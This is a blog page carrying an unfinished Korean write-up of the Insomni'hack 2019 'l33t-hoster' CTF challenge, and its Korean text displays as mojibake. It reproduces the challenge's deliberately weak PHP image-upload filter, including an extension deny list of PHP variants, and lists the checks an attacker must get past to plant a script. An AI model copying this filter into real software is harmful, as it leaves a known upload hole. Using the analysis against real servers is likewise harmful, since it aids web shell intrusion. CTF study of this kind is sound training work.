<!DOCTYPE html>
<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@100;300;400;500;700;900&display=swap"
    rel="stylesheet">

<html class="no-js">
<head>
    <meta charset="utf-8">

    <base href="https://mingzz1.github.io/">
    <title> mingzzi&#39;s blog </title>
    <meta name="description" content="mingzzi&#39;s blog">

    <link rel="canonical" href="https://mingzz1.github.io/ctf/2019/2019/01/24/ctf-insomnihack2019-l33t-hoster.html/">
    <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />

    
    <link rel="stylesheet" href="https://mingzz1.github.io/sass/main.min.94d6e676b5b11c22f591951fd9b4e6ab0f6a3179daac45918d1fbc53ed631f00.css">

    <link rel="shortcut icon" href="https://mingzz1.github.io/img/favicon.ico" type="image/x-icon">

    <link rel="stylesheet" type="text/css"
        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">


    <script src="https://code.jquery.com/jquery-1.12.4.min.js"
        integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>

    
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-130304424-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'UA-130304424-1');
    </script>

    
    <script data-ad-client="ca-pub-1587587893565234" async
        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>

    <script>
        $(function () {
            $(".cat1>li").click(function () {
                $(this).siblings().find('ul').slideUp(300);
                $(this).find('ul').slideToggle(300);
            })

            $(window).scroll(function () {
                activeBg();
            });

            activeBg();


            $('.h-menu').click(function (e) {
                e.preventDefault();
                $('.side').addClass('on');
            });

            $('.close').click(function (e) {
                e.preventDefault();
                $('.side').removeClass('on');
            });

            $('ul.slide>li').click(function () {
                if ($(this).find('.down').hasClass('on')) {
                    $(this).find('.down').removeClass('on');
                    $(this).find('.down').prev().stop().slideUp(500);
                } else {
                    $(this).find('.down').addClass('on');
                    $(this).find('.down').prev().stop().slideDown(500);
                }
            })
        })

        function activeBg() {
            if ($(window).scrollTop() > 0) {
                $('.site-header').addClass('on');
            } else {
                $('.site-header').removeClass('on');
            }
        }

    </script>
</head>
<header class="site-header">
    <h1 class="web-t" onclick="window.location.href='/'"><span>def</span><em> ì²œë°©ì§€ì¶• ì–¼ë ëš±ë•…
        </em><span>(</span><i>ğŸ¤£</i><span>)</span>:<br />
        &nbsp;&nbsp;&nbsp;&nbsp;<span class="nbsp">title =</span> ë¹™ê¸€ë¹™ê¸€ ëŒì•„ê°€ëŠ” ìš°ë‹¹íƒ•íƒ• ì‹œíë¡œê·¸
        <br />
    </h1>

    <h1 class="mob-t" onclick="window.location.href='/'">
        <span>ì²œ/ì–¼/ë¹™/ëŒ(</span><i>ğŸ¤£</i><span>)</span>
        <br />ìš°ë‹¹íƒ•íƒ• ì‹œíë¡œê·¸
    </h1>

    <nav>
        <div class="h-menu">
            <span></span>
            <span></span>
            <span></span>
        </div>
        <div class="side">
            <div class="close">
                <span></span>
                <span></span>
            </div>
            <ul class="slide">
                <li class="on"><a href="#">All Post</a>
                </li>
                <li><a>Pentesting</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//pentesting/ios">iOS</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/android">Android</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/web">Web</a></li>
                        <li><a href="https://mingzz1.github.io//pentesting/cloud">Cloud</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Wargame</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//wargame/lord-of-sql-injection">Lord of SQL Injection</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/pwnable.kr">Pwnable.kr</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/wargame.kr">Wargame.kr</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/xss-game">XSS Game</a></li>
                        <li><a href="https://mingzz1.github.io//wargame/owasp">OWASP-MSTG Crackmes</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>CTF</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//ctf/2018">2018</a></li>
                        <li><a href="https://mingzz1.github.io//ctf/2019">2019</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Error</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//error/linux">Linux</a></li>
                        <li><a href="https://mingzz1.github.io//error/windows">Windows</a></li>
                        <li><a href="https://mingzz1.github.io//error/python">Python</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <li><a>Development</a>
                    <ul>
                        <li><a href="https://mingzz1.github.io//development/basic">Basic</a></li>
                        <li><a href="https://mingzz1.github.io//development/web">Web</a></li>
                        <li><a href="https://mingzz1.github.io//development/mobile">Mobile</a></li>
                        <li><a href="https://mingzz1.github.io//development/database">Database</a></li>
                        <li><a href="https://mingzz1.github.io//development/docker">Docker</a></li>
                        <li><a href="https://mingzz1.github.io//development/github-blog">Github Blog</a></li>
                        <li><a href="https://mingzz1.github.io//development/secure-coding">Secure Coding</a></li>
                    </ul>
                    <span class="down"></span>
                </li>
                <hr />
                <li><a href="https://mingzz1.github.io//about">About</a></li>
                <li><a href="https://mingzz1.github.io//archive">Archive</a></li>
                <li><a href="https://mingzz1.github.io//tags">Tag</a></li>
            </ul>
        </div>
    </nav>
</header>

<body>
    <div class="content">
        
        

<article>
    <header>
        <h1 class="title">[Insomni&#39;hack 2019] l33t-hoster Write up(ë¯¸ì™„ì„±)</h1>
        <p class="meta">
            2019-01-24
        </p>
    </header>
    <section class="post-content"><p>ì´ë²ˆì—ëŠ” Insomni&rsquo;hack teaserì— ì¶œì œ ëœ l33t-hoster ë¬¸ì œì˜ í’€ì´ë¥¼ ì ì–´ë³´ë ¤ í•œë‹¤.
ê³µêµë¡­ê²Œë„ ë¬¸ì œë¥¼ í’€ë‹¤ê°€ ì„œë²„ê°€ ë‹«í˜€ë²„ë ¤ì„œ ëê¹Œì§€ í’€ì§„ ëª»í–ˆë‹¤. ã… ã… </p>
<p>ë¬¸ì œ ì •ë³´ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">You can host your l33t pictures here.
</code></pre></td></tr></table>
</div>
</div><p>í™ˆí˜ì´ì§€ì— ì ‘ì†í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ íŒŒì¼ì„ ì˜¬ë¦´ ìˆ˜ ìˆëŠ” í˜ì´ì§€ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p>
<p><img src="/images/CTF/insomnihack2019/l33t-hoster/l33t_01.png" alt=""></p>
<p>íŒŒì¼ ì—…ë¡œë“œë¥¼ í•˜ë¼ê³  í•˜ë‹ˆ ë”± ì›¹ ì‰˜ ê°™ì€ ê²ƒì„ ì—…ë¡œë“œ í•´ì•¼ í•  ê²ƒ ê°™ì€ ëŠë‚Œì´ë‹¤.
ê·¸ëŸ°ë° ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸ í•´ ë³´ë©´ ì•„ë˜ì— ì£¼ì„ìœ¼ë¡œ <code>/?source</code>ë¼ê³  ì íŒ ë¶€ë¶„ì´ ìˆë‹¤.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">h3</span>&gt;Your &lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">images/a5d610a9bfe3775f2234f376f58a0cc404663bae/</span>&gt;files&lt;/<span style="color:#ff79c6">a</span>&gt;:&lt;/<span style="color:#ff79c6">h3</span>&gt;&lt;<span style="color:#ff79c6">ul</span>&gt;&lt;/<span style="color:#ff79c6">ul</span>&gt;
&lt;<span style="color:#ff79c6">h1</span>&gt;Upload your pics!&lt;/<span style="color:#ff79c6">h1</span>&gt;
&lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;POST&#34;</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;?&#34;</span> <span style="color:#50fa7b">enctype</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;file&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;image&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">upload</span>&gt;
&lt;/<span style="color:#ff79c6">form</span>&gt;
<span style="color:#6272a4">&lt;!-- /?source --&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>ì¹œì ˆí•˜ê²Œ ì†ŒìŠ¤ì½”ë“œë¥¼ ì œê³µ í•´ ì£¼ì—ˆë‹¤.
ì†ŒìŠ¤ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì•˜ë‹¤</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#ff79c6">&lt;?php</span>
<span style="color:#ff79c6">if</span> (isset(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#34;source&#34;</span>])) 
    <span style="color:#ff79c6">die</span>(highlight_file(__FILE__));

session_start();

<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_SESSION</span>[<span style="color:#f1fa8c">&#34;home&#34;</span>])) {
    <span style="color:#8be9fd;font-style:italic">$_SESSION</span>[<span style="color:#f1fa8c">&#34;home&#34;</span>] <span style="color:#ff79c6">=</span> bin2hex(random_bytes(<span style="color:#bd93f9">20</span>));
}
<span style="color:#8be9fd;font-style:italic">$userdir</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;images/</span><span style="color:#f1fa8c">{</span>$_SESSION[&#34;home&#34;]<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/&#34;</span>;
<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>file_exists(<span style="color:#8be9fd;font-style:italic">$userdir</span>)) {
    mkdir(<span style="color:#8be9fd;font-style:italic">$userdir</span>);
}

<span style="color:#8be9fd;font-style:italic">$disallowed_ext</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">array</span>(
    <span style="color:#f1fa8c">&#34;php&#34;</span>,
    <span style="color:#f1fa8c">&#34;php3&#34;</span>,
    <span style="color:#f1fa8c">&#34;php4&#34;</span>,
    <span style="color:#f1fa8c">&#34;php5&#34;</span>,
    <span style="color:#f1fa8c">&#34;php7&#34;</span>,
    <span style="color:#f1fa8c">&#34;pht&#34;</span>,
    <span style="color:#f1fa8c">&#34;phtm&#34;</span>,
    <span style="color:#f1fa8c">&#34;phtml&#34;</span>,
    <span style="color:#f1fa8c">&#34;phar&#34;</span>,
    <span style="color:#f1fa8c">&#34;phps&#34;</span>,
);


<span style="color:#ff79c6">if</span> (isset(<span style="color:#8be9fd;font-style:italic">$_POST</span>[<span style="color:#f1fa8c">&#34;upload&#34;</span>])) {
    <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#39;image&#39;</span>][<span style="color:#f1fa8c">&#39;error&#39;</span>] <span style="color:#ff79c6">!==</span> UPLOAD_ERR_OK) {
        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;yuuuge fail&#34;</span>);
    }

    <span style="color:#8be9fd;font-style:italic">$tmp_name</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#34;image&#34;</span>][<span style="color:#f1fa8c">&#34;tmp_name&#34;</span>];
    <span style="color:#8be9fd;font-style:italic">$name</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">$_FILES</span>[<span style="color:#f1fa8c">&#34;image&#34;</span>][<span style="color:#f1fa8c">&#34;name&#34;</span>];
    <span style="color:#8be9fd;font-style:italic">$parts</span> <span style="color:#ff79c6">=</span> explode(<span style="color:#f1fa8c">&#34;.&#34;</span>, <span style="color:#8be9fd;font-style:italic">$name</span>);
    <span style="color:#8be9fd;font-style:italic">$ext</span> <span style="color:#ff79c6">=</span> array_pop(<span style="color:#8be9fd;font-style:italic">$parts</span>);

    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">empty</span>(<span style="color:#8be9fd;font-style:italic">$parts</span>[<span style="color:#bd93f9">0</span>])) {
        array_shift(<span style="color:#8be9fd;font-style:italic">$parts</span>);
    }

    <span style="color:#ff79c6">if</span> (count(<span style="color:#8be9fd;font-style:italic">$parts</span>) <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">0</span>) {
        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;lol filename is empty&#34;</span>);
    }

    <span style="color:#ff79c6">if</span> (in_array(<span style="color:#8be9fd;font-style:italic">$ext</span>, <span style="color:#8be9fd;font-style:italic">$disallowed_ext</span>, <span style="color:#ff79c6">TRUE</span>)) {
        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;lol nice try, but im not stupid dude...&#34;</span>);
    }

    <span style="color:#8be9fd;font-style:italic">$image</span> <span style="color:#ff79c6">=</span> file_get_contents(<span style="color:#8be9fd;font-style:italic">$tmp_name</span>);
    <span style="color:#ff79c6">if</span> (mb_strpos(<span style="color:#8be9fd;font-style:italic">$image</span>, <span style="color:#f1fa8c">&#34;&lt;?&#34;</span>) <span style="color:#ff79c6">!==</span> <span style="color:#ff79c6">FALSE</span>) {
        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;why would you need php in a pic.....&#34;</span>);
    }

    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>exif_imagetype(<span style="color:#8be9fd;font-style:italic">$tmp_name</span>)) {
        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;not an image.&#34;</span>);
    }

    <span style="color:#8be9fd;font-style:italic">$image_size</span> <span style="color:#ff79c6">=</span> getimagesize(<span style="color:#8be9fd;font-style:italic">$tmp_name</span>);
    <span style="color:#ff79c6">if</span> (<span style="color:#8be9fd;font-style:italic">$image_size</span>[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">!==</span> <span style="color:#bd93f9">1337</span> <span style="color:#ff79c6">||</span> <span style="color:#8be9fd;font-style:italic">$image_size</span>[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">!==</span> <span style="color:#bd93f9">1337</span>) {
        <span style="color:#ff79c6">die</span>(<span style="color:#f1fa8c">&#34;lol noob, your pic is not l33t enough&#34;</span>);
    }

    <span style="color:#8be9fd;font-style:italic">$name</span> <span style="color:#ff79c6">=</span> implode(<span style="color:#f1fa8c">&#34;.&#34;</span>, <span style="color:#8be9fd;font-style:italic">$parts</span>);
    move_uploaded_file(<span style="color:#8be9fd;font-style:italic">$tmp_name</span>, <span style="color:#8be9fd;font-style:italic">$userdir</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$name</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;.&#34;</span> <span style="color:#ff79c6">.</span> <span style="color:#8be9fd;font-style:italic">$ext</span>);
}

<span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;h3&gt;Your &lt;a href=</span><span style="color:#f1fa8c">$userdir</span><span style="color:#f1fa8c">&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&#34;</span>;
<span style="color:#ff79c6">foreach</span>(glob(<span style="color:#8be9fd;font-style:italic">$userdir</span> <span style="color:#ff79c6">.</span> <span style="color:#f1fa8c">&#34;*&#34;</span>) <span style="color:#ff79c6">as</span> <span style="color:#8be9fd;font-style:italic">$file</span>) {
    <span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;li&gt;&lt;a href=&#39;</span><span style="color:#f1fa8c">$file</span><span style="color:#f1fa8c">&#39;&gt;</span><span style="color:#f1fa8c">$file</span><span style="color:#f1fa8c">&lt;/a&gt;&lt;/li&gt;&#34;</span>;
}
<span style="color:#ff79c6">echo</span> <span style="color:#f1fa8c">&#34;&lt;/ul&gt;&#34;</span>;

<span style="color:#ff79c6">?&gt;</span>

&lt;<span style="color:#ff79c6">h1</span>&gt;Upload your pics!&lt;/<span style="color:#ff79c6">h1</span>&gt;
&lt;<span style="color:#ff79c6">form</span> <span style="color:#50fa7b">method</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;POST&#34;</span> <span style="color:#50fa7b">action</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;?&#34;</span> <span style="color:#50fa7b">enctype</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;multipart/form-data&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;file&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;image&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">type</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;submit&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">upload</span>&gt;
&lt;/<span style="color:#ff79c6">form</span>&gt;
<span style="color:#6272a4">&lt;!-- /?source --&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>íŒŒì¼ì„ ì—…ë¡œë“œ í•  ìˆ˜ ìˆê¸´ í•œë° ì œì•½ì¡°ê±´ì´ ë„ˆë¬´ ë§ë‹¤.</p>
<p>ì •ë¦¬ í•´ ë³´ë©´ ë‹¤ìŒê³¼ ê°™ë‹¤.</p>
<ul>
<li>íŒŒì¼ ëª…ì—ì„œ . ì•ì— ì•„ë¬´ëŸ° ë¬¸ìë„ ì—†ìœ¼ë©´ ì•ˆëœë‹¤. ì¦‰, .htaccessëŠ” . ë’¤ì˜ ë¶€ë¶„ë§Œ ìˆê¸° ë•Œë¬¸ì— ì—…ë¡œë“œ í•  ìˆ˜ ì—†ë‹¤.</li>
<li>$disallowed_extì— ìˆëŠ” í™•ì¥ìëŠ” ì—…ë¡œë“œ í•  ìˆ˜ ì—†ë‹¤.</li>
<li>íŒŒì¼ì˜ ë‚´ìš©ì—ëŠ” &lt;?ê°€ ë“¤ì–´ìˆì„ ìˆ˜ ì—†ë‹¤.</li>
<li>ì—…ë¡œë“œ í•œ íŒŒì¼ì€ exif_imagetype í•¨ìˆ˜ì—ì„œ ê²€ì‚¬í•˜ëŠ” ì´ë¯¸ì§€ í˜•ì‹ ì¤‘ í•˜ë‚˜ì—¬ì•¼ í•œë‹¤.</li>
<li>ì—…ë¡œë“œ í•œ íŒŒì¼ì˜ ê°€ë¡œ, ì„¸ë¡œ í¬ê¸°ëŠ” 1337ì´ì–´ì•¼ í•œë‹¤.</li>
</ul>
<p>ì´ ëª¨ë“  ì¡°ê±´ì„ í†µê³¼í•˜ë©´ <code>images/RANDOM_BYTES/FILENAME.EXT</code>ì˜ ê²½ë¡œì— íŒŒì¼ì´ ì—…ë¡œë“œ ëœë‹¤.
